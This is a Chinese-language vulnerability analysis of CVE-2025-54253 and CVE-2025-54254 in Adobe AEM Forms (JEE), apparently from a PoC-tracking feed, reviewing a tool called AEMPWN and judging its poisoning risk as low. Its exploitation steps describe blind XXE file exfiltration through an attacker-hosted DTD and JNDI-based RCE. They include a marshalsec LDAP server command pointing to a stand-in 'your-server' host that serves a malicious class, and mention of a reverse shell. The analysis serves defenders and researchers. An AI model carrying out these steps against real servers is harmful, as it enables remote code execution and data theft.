## CVE-2025-54253 - Adobe Experience Manager (AEM) Forms (JEE) RCE, XXE

**漏洞编号:** CVE-2025-54253

**漏洞类型:** RCE, XXE

**影响应用:** Adobe Experience Manager (AEM) Forms (JEE)

**危害等级:** 高危

**CVSS评分:** 

**影响版本:** 受影响的AEM Forms (JEE) 特定配置版本

**利用条件:** 需要网络访问、特定的AEM Forms (JEE) 配置、攻击者控制的外部HTTP/LDAP服务器

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 高

**投毒风险:** 10%

## 详情

CVE-2025-54253和CVE-2025-54254是影响Adobe Experience Manager (AEM) Forms (JEE) 产品的两个关键漏洞。CVE-2025-54253是一个配置依赖型的远程代码执行（RCE）漏洞，而CVE-2025-54254是一个XML外部实体（XXE）注入漏洞，可导致敏感文件泄露并可能升级为RCE。

**POC有效性分析：**
本分析基于名为`AEMPWN`的POC工具，该工具旨在识别AEM Forms中的高风险漏洞。`AEMPWN`提供了三种执行模式，证明了其高度的灵活性和有效性：
1.  **安全PoC模式（--poc）**：此模式用于安全地识别不安全的XML解析行为和可利用的攻击面，而不会触发破坏性操作。它通过验证XML反射、非HTML结构化响应、金丝雀令牌反射以及不安全XML处理的指标来确认漏洞。这种模式对于初步漏洞分类和内部报告非常有效，可在不产生副作用的情况下提供漏洞存在的安全信号。
2.  **OOB XXE模式（--oob）**：此模式专注于通过AEM服务器发出的带外（OOB）请求来确认盲XXE漏洞。它要求攻击者控制一个HTTP服务器来托管DTD文件并观察入站请求，从而证明XML解析器获取外部实体、目标服务器发出出站网络请求以及敏感本地文件可以被读取和外泄的能力。POC明确指出，仅凭Burp Collaborator不足以进行完整的XXE利用，因为它不支持DTD文件托管或LDAP/JNDI利用，强调了对自定义HTTP服务器的需求。
3.  **RCE模式（--rce）**：这是最关键的模式，用于在AEM服务器上演示实际的代码执行，达到了P1级别的危害。此模式依赖于通过XML解析实现的JNDI注入，要求攻击者运行一个能够提供Java类引用的LDAP服务器和一个托管已编译Java类的HTTP服务器。当AEM服务器尝试解析JNDI引用时，它会连接到攻击者的LDAP监听器，LDAP响应会指向恶意Java类，该类随后被JVM加载并执行，从而实现远程代码执行。POC中提供了使用`marshalsec`工具启动LDAP服务器的示例命令，以及一个简单的Java恶意类（如创建`/tmp/pwned`文件或反向shell）的伪代码，这表明该工具具备完整的RCE利用能力。综合来看，`AEMPWN`的文档详细、功能划分明确，从探测到完全利用的路径清晰，是一个高质量且功能完整的POC工具，对于授权的安全测试具有极高的有效性。

**利用步骤：**
利用这两个漏洞，攻击者需要进行多阶段的操作，具体取决于所针对的漏洞类型和所需的危害级别。
1.  **环境准备**：攻击者需识别一个配置存在漏洞且可通过网络访问的Adobe Experience Manager (AEM) Forms (JEE) 实例。此外，攻击者需准备一个可控的外部服务器（如VPS），用于托管恶意的DTD文件（针对XXE）和编译后的Java恶意类（针对RCE），并能监听入站HTTP请求。针对RCE，还需要设置一个LDAP服务器，例如使用`marshalsec`工具，配置其指向恶意Java类。
2.  **XXE漏洞利用（CVE-2025-54254）**：攻击者首先使用`AEMPWN`的`--poc`模式进行初步扫描，确认目标AEM Forms实例存在不安全的XML解析行为。随后，切换到`--oob`模式进行盲XXE确认，攻击者在自己的HTTP服务器上部署恶意的DTD文件。`AEMPWN`发送包含外部实体引用的XML请求到AEM服务器，AEM服务器将尝试从攻击者HTTP服务器获取DTD文件。通过观察HTTP服务器上的入站连接，确认XXE存在。通过精心构造，攻击者可以读取目标AEM服务器上的本地文件，并通过HTTP请求的查询参数外带文件内容。
3.  **RCE漏洞利用（CVE-2025-54253）**：在确认XXE或存在RCE配置前提下，攻击者进入RCE模式。攻击者编译一个恶意Java类（如执行`touch /tmp/pwned`或启动反向shell），托管在攻击者的HTTP服务器上。攻击者启动`marshalsec` LDAP服务器，并配置其指向恶意Java类（例如：`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://your-server/#Exploit" 1389`）。`AEMPWN`工具发送特制的XML请求到AEM服务器，该请求包含指向攻击者LDAP服务器的JNDI引用。AEM服务器解析JNDI引用时，连接到LDAP服务器，获取Java类引用，从HTTP服务器下载并加载恶意Java类，最终在AEM服务器的JVM环境中执行任意系统命令，实现RCE。

**投毒风险分析：**
对于`AEMPWN`这个POC工具本身，其投毒风险评估为**低（10%）**。该POC的README文件清晰地指明了其用途——作为“用于识别高风险Adobe Experience Manager (AEM) Forms漏洞的专用扫描器”，并明确声明“此工具仅用于授权的安全测试”。这些都表明其设计意图是作为一种合法的安全研究和测试工具。在工具的描述中，不同执行模式所需的外部交互（例如，OOB XXE模式需要攻击者控制的HTTP服务器来托管DTD文件和观察入站请求；RCE模式需要LDAP服务器和托管恶意Java类的HTTP服务器）都被详细而透明地列出。这些外部服务器和文件的设置是漏洞利用的**固有组成部分**，而非POC工具本身在背后进行的恶意行为。POC中提供的“恶意类示例”（Malicious class example），如用于执行`Runtime.getRu...`来创建`/tmp/pwned`文件或反向shell的Java代码片段，是明确作为**漏洞利用的载荷**来展示RCE能力的一部分。这些代码是攻击者为了验证漏洞而故意部署和执行在目标系统上的，它们并不是隐藏在`AEMPWN`工具代码中、在用户不知情的情况下执行的恶意功能。该POC的README内容没有表现出任何典型的投毒迹象，例如代码混淆、超出预期范围的恶意行为、未经声明的外部脚本加载或不安全上下文中的`eval`函数滥用。因此，可以认定`AEMPWN`是一个纯粹的防御性安全研究工具，其代码和描述没有表现出被注入恶意功能或旨在损害使用者的迹象。使用者应严格按照其“仅用于授权安全测试”的声明，并在受控环境中进行操作。

**项目地址:** 

**漏洞详情:** 
